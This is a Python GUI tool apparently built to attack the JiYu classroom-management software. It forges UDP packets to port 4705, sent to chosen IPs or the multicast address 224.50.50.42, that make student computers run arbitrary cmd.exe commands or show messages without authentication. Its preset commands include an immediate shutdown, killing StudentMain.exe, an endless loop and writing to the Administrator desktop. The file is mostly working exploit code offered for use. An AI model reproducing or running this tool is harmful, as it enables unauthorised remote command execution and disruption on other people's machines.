#coding:utf-8
import binascii
import socket
import time
from simple_widgets import *
from simple_window import *
from tkinter import *
from tkinter.messagebox import *
from tkinter import ttk
from PIL import Image,ImageTk, ImageSequence


image=Image.open(".\\background.jpeg")
image=image.resize((700,300))
root_window = OTk(title="极域反控装置v1.0",win_wid=700,win_hei=300,topbg='#4c8dca',button=['×'],command=['<close>'],abg=['<close-y>'],win_bg_lj=image,oimage=False)
root_window.geometry("700x300+"+str(int(root_window.winfo_screenwidth()/2-250))+"+"+str(int(root_window.winfo_screenheight()/2-150)))
root_window.resizable(False,False)
root_window.iconbitmap(".\\jiyu.ico")
imagee=ImageTk.PhotoImage(image)
#Label(root_window,image=imagee).place(relwidth=1,relheight=1,x=0,y=0)

def zxml(*event):
    #C:\Windows\System32
    
    ml="C:\\WINDOWS\\system32\\cmd.exe"
    cs="/c "
    
    
    cs+=mlcombobox.get()
    print(ml)
    print (cs)
    if ml=="":
        result=showinfo("错误","没有命令")
        return
    
    try:
        iplist.get(iplist.curselection())
    except:
        result=showinfo("错误","没有指定ip")
        return
    payload= b"\x44\x4d\x4f\x43\x00\x00\x01\x00\x6e\x03\x00\x00\x53\xca\x6c\x1a\xee\x10\x8e\x41\x9f\x49\x72\xf3\x6d\x10\x9c\x69\x20\x4e\x00\x00\xc0\xa8\x03\xfe\x61\x03\x00\x00\x61\x03\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00"
    aaa=""
    bbb=""
    
    for i in ml:
        aaa += hex(ord(i))[2:]+"00"
    for i in cs:
        bbb += hex(ord(i))[2:]+"00"
    send=binascii.unhexlify(aaa)
    cs=binascii.unhexlify(bbb)
        
    payload+=send
    payload+=b"\x00"*(512-len(send))
    payload+=cs
    payload+=b"\x00"*(324-len(cs))
    payload+=b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    ip=iplist.get(iplist.curselection())
    port=4705
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.sendto(payload,(ip,port))

def fsxx(*event):
    try:
        iplist.get(iplist.curselection())
    except:
        result=showinfo("错误","没有指定ip")
        return
    payload=b"\x44\x4d\x4f\x43\x00\x00\x01\x00\x9e\x03\x00\x00\x7c\x73\x6b\xf7\x79\x0c\xdd\x46\x9d\x87\x4b\x4d\x79\xbc\x2b\x8d\x20\x4e\x00\x00\xc0\xa8\xab\x83\x91\x03\x00\x00\x91\x03\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00"
    ip=iplist.get(iplist.curselection())
    message=""
    message=msgentry.get()
    aaa=""
    for i in message:
        if (i>="a" and i<="z")or(i>="A" and i<="Z"):
            aaa+="00"
        aaa+=hex(ord(i))[2:]
    js=0
    aaa=list(aaa)
    for i in aaa:
        if(js%4==0):
            aaa[js],aaa[js+2]=aaa[js+2],aaa[js]
            aaa[js+1],aaa[js+3]=aaa[js+3],aaa[js+1]
        js+=1
    aaa=''.join(aaa)
    send=binascii.unhexlify(aaa)
    payload+=send
    payload+=b"\x00"*(898-len(send))

    port=4705
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.sendto(payload,(ip,port))

def pick(*event):
    global a,flag
    im = Image.open('1.gif')
    iter=ImageSequence.Iterator(im)
    for frame in iter:
        time.sleep(0.01)
        frame=frame.resize((100,100))
        pic=ImageTk.PhotoImage(frame)
        canvas.create_image((0,0), image=pic,anchor="nw")
        root_window.update_idletasks()  #刷新
        root_window.update()

def tjip(*event):
    iplist.insert(END,ipentry.get())
    ipentry.delete(0,END)

def delip(*event):
    iplist.delete(iplist.curselection())

#ip
#组播ip：  224.50.50.42
iplabel=Label(root_window,text="添加ip：")
ipentry=Entry()
ipentry.bind("<Return>",tjip)
iplist=Listbox(root_window)
iplist.bind("<KeyPress-Delete>",delip)
delbutton=Button(root_window,text="删除该条",command=delip,relief="groove")

iplist.insert(END,"224.50.50.42")
Label(root_window,text="--ip列表--").place(relx=0,rely=0.27,relwidth=0.192)
iplist.place(relx=0,rely=0.35,relwidth=0.192,relheight=0.68)
iplabel.place(relx=0,rely=0.2,height=20,relwidth=0.07)
ipentry.place(relx=0.07,rely=0.2,relwidth=0.122,height=20)
delbutton.place(relx=0,rely=0.93,height=20,relwidth=0.192)

#执行命令
mlcombobox=ttk.Combobox()
mlcombobox['value']=('shutdown -s -t 0','shutdown -i','echo  >C:\\Users\\Administrator\\Desktop','for /l %a in (0,0,1) do','taskkill -F -IM StudentMain.exe','start chrome.exe "网址"')
mlcombobox.bind("<Return>",zxml)
mllabel=TpLabel(root_window,backpic=image,text="命令：",font=("楷体",15))
mlbutton=TpButton(root_window,backpic=image,text="执行命令",command=zxml,relief="groove",blur=10,brighter=1.3)

mlcombobox.place(relx=0.2,rely=0.3,relwidth=0.6,height=20)
mllabel.place(relx=0.2,rely=0.2,height=20,relwidth=0.1)
mlbutton.place(relx=0.8,rely=0.3,height=20,relwidth=0.1)

#发送消息
msgentry=Entry()
msgentry.bind("<Return>",fsxx)
msglabel=TpLabel(root_window,backpic=image,text="消息内容:",font=("楷体",15))
msgbutton=TpButton(root_window,backpic=image,text="发送消息",command=fsxx,relief="groove",blur=10,brighter=1.3)


msglabel.place(relx=0.2,rely=0.4,height=20,relwidth=0.15)
msgentry.place(relx=0.2,rely=0.5,relwidth=0.6,height=20)
msgbutton.place(relx=0.8,rely=0.5,height=20,relwidth=0.1)

#动图显示
canvas = TpCanvas(root_window,width=100, height=100,bg='white',relief="flat",highlightthickness=0,backpic=image)
canvas.place(x=600,y=200,width=200, height=200)
img=[]
tmp=Image.open('1.gif')
tmp=ImageTk.PhotoImage(tmp.resize((100,100)))
canvas.create_image((0,0),image=tmp,anchor="nw")
root_window.bind("<Button-1>",pick)


root_window.mainloop()



